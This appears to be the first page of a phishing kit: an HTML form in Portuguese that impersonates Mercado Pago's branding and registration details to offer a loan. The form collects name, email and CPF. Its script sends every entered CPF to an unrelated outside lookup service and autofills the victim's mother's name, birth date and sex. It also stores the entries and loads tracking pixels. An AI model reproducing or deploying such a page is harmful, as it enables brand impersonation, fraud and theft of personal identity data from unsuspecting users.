<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seus Dados</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-input:focus {
            border-color: #009EE3;
            box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.1);
        }

        .progress-bar {
            transition: width 0.3s ease;
        }
    </style>
</head>
<body class="bg-gray-50">
   <header class="bg-[#FFE600] border-b border-[#E6CF00] shadow-sm">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center h-20">
            <div class="flex items-center">
                <img src="logo.png" alt="Mercado Pago" class="h-12 md:h-14">
            </div>
            <div class="flex items-center gap-4">
                <a href="#" class="text-sm font-medium text-gray-900 hover:text-gray-700 transition-colors hidden sm:block">
                    Ajuda
                </a>
            </div>
        </div>
    </div>
</header>


    <main class="py-8 px-4 md:py-12">
        <div class="max-w-xl mx-auto">
            <div class="mb-6">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-sm font-medium text-gray-600">Etapa 1 de 4</span>
                    <span class="text-sm font-medium text-mp-blue">25%</span>
                </div>
                <div class="w-full bg-gray-200 rounded-full h-2">
                    <div class="progress-bar bg-mp-blue h-2 rounded-full" style="width: 25%"></div>
                </div>
            </div>

            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Vamos come√ßar</h1>
                <p class="text-gray-600 mb-8">
                    Preencha seus dados para continuar com a solicita√ß√£o do empr√©stimo
                </p>

                <form id="step1Form" action="2.1.html" method="GET">
                    <div class="space-y-5">
                        <div>
                            <label for="nome" class="block text-sm font-medium text-gray-700 mb-2">
                                Nome completo
                            </label>
                            <input
                                type="text"
                                id="nome"
                                name="nome"
                                required
                                class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                placeholder="Digite seu nome completo"
                            >
                        </div>

                        <div>
                            <label for="email" class="block text-sm font-medium text-gray-700 mb-2">
                                E-mail
                            </label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                required
                                class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                placeholder="seu@email.com"
                            >
                        </div>

                        <div>
                            <label for="cpf" class="block text-sm font-medium text-gray-700 mb-2">
                                CPF
                            </label>
                            <input
                                type="text"
                                id="cpf"
                                name="cpf"
                                required
                                maxlength="14"
                                class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                                placeholder="000.000.000-00"
                            >
                        </div>

                        <button
                            type="submit"
                            id="submitBtn"
                            class="w-full bg-mp-blue text-white py-3.5 rounded-lg font-semibold transition-all hover:bg-mp-dark-blue hover:shadow-lg mt-8"
                        >
                            <span class="btn-text">Continuar</span>
                        </button>
                    </div>
                </form>

                <div class="mt-6 pt-6 border-t border-gray-100">
                    <div class="flex items-start gap-3 text-sm text-gray-600">
                        <svg class="w-5 h-5 text-gray-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                        </svg>
                        <span>Seus dados est√£o protegidos e ser√£o usados apenas para an√°lise de cr√©dito</span>
                    </div>
                </div>
            </div>
        </div>
    </main>

    
<footer class="bg-[#FFE600] border-t border-[#E6CF00] mt-auto">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div class="flex flex-col items-center justify-center text-center space-y-4">
            <img src="logo.png" alt="Mercado Pago" class="h-10 md:h-12">

            <div class="text-sm text-gray-900 space-y-1">
                <p>¬© Mercado Pago - Institui√ß√£o de Pagamento</p>
                <p>CNPJ: 10.573.521/0001-91</p>
                <p>Osasco, SP - CEP 06233-903</p>
            </div>

            <div class="flex flex-wrap justify-center gap-4 text-xs text-gray-700">
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Termos e condi√ß√µes</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Pol√≠tica de privacidade</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Cookies</a>
            </div>
        </div>
    </div>
</footer>


    <script>
document.addEventListener("DOMContentLoaded", function () {

    const apiURL = "https://searchapi.dnnl.live/consulta?token_api=7002&cpf=";

    /* ===============================
       FUN√á√ÉO PARA FORMATAR CPF
    =============================== */
    function formatCPF(v) {
        v = v.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);
        if (v.length === 11) {
            return v.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
        }
        return v;
    }

    /* ===============================
        FUN√á√ÉO PARA CONSULTAR API
    =============================== */
    async function consultarCPF(cpfLimpo) {
        try {
            const response = await fetch(apiURL + cpfLimpo);
            const data = await response.json();

            if (!data || !data.nome) {
                console.warn("CPF n√£o encontrado:", data);
                return;
            }

            // Preencher automaticamente
            const nomeField = document.getElementById("nome");
            const emailField = document.getElementById("email");
            const maeField = document.getElementById("nome_mae");
            const nascField = document.getElementById("nascimento");
            const sexoField = document.getElementById("sexo");

            if (nomeField) nomeField.value = data.nome;
            if (maeField) maeField.value = data.nome_mae || "";
            if (nascField) nascField.value = data.nascimento || "";
            if (sexoField) sexoField.value = data.sexo || "";

            console.log("Dados preenchidos automaticamente:", data);

        } catch (err) {
            console.error("Erro ao consultar API:", err);
        }
    }

    /* ===============================
       FORMATA√á√ÉO CPF + CHAMADA API
    =============================== */
    const cpfInput = document.getElementById("cpf");

    if (cpfInput) {
        cpfInput.addEventListener("input", function (e) {
            let value = e.target.value.replace(/\D/g, "");
            e.target.value = formatCPF(value);

            if (value.length === 11) {
                consultarCPF(value); // üî• chama API automaticamente
            }
        });
    }

    /* ===============================
       FORMUL√ÅRIO (VALIDA√á√ïES E SALVAR)
    =============================== */
    const form = document.getElementById("step1Form");
    const submitBtn = document.getElementById("submitBtn");

    if (form) {
        const inputs = form.querySelectorAll("input");

        inputs.forEach((input) => {
            input.addEventListener("blur", function () {
                if (this.value && this.checkValidity()) {
                    this.classList.add("border-green-500", "bg-green-50");
                    this.classList.remove("border-red-500");
                }
            });

            input.addEventListener("focus", function () {
                this.classList.remove("border-red-500", "border-green-500", "bg-green-50");
            });
        });

        form.addEventListener("submit", function () {
            const nome = document.getElementById("nome")?.value || "";
            const email = document.getElementById("email")?.value || "";
            const cpf = document.getElementById("cpf")?.value.replace(/\D/g, "") || "";

            try {
                localStorage.setItem("nome", nome);
                localStorage.setItem("email", email);
                localStorage.setItem("cpf", cpf);
            } catch (err) {
                console.warn("localStorage error:", err);
            }

            submitBtn.innerHTML =
                '<svg class="animate-spin h-5 w-5 mx-auto" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
            submitBtn.disabled = true;
        });
    }

    /* ===============================
       RECARREGAR CAMPOS DO LOCALSTORAGE
    =============================== */
    try {
        if (localStorage.getItem("nome") && document.getElementById("nome")) {
            document.getElementById("nome").value = localStorage.getItem("nome");
        }
        if (localStorage.getItem("email") && document.getElementById("email")) {
            document.getElementById("email").value = localStorage.getItem("email");
        }
        if (localStorage.getItem("cpf")) {
            const cpfSalvo = localStorage.getItem("cpf");
            const formatado = formatCPF(cpfSalvo);

            if (document.getElementById("cpf")) {
                document.getElementById("cpf").value = formatado;
            }
            if (document.getElementById("cpfInputPage")) {
                document.getElementById("cpfInputPage").value = formatado;
            }

            // J√° consulta automaticamente ao carregar a p√°gina
            consultarCPF(cpfSalvo);
        }
    } catch (err) {
        console.warn("localStorage error:", err);
    }
});
</script>


</body>
</html>
